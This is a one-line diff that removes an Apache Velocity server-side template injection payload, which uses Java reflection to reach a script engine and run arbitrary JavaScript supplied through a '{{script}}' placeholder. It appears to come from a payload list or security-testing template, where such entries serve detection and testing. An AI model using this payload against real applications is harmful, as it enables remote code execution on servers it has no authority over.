@@ -1,1 +1,0 @@
-#set($x='') #set($cz = $x.class.forName('javax.script.ScriptEngineManager')) $cz.getDeclaredConstructor(null).newInstance().getEngineByName('js').eval('{{script}}')
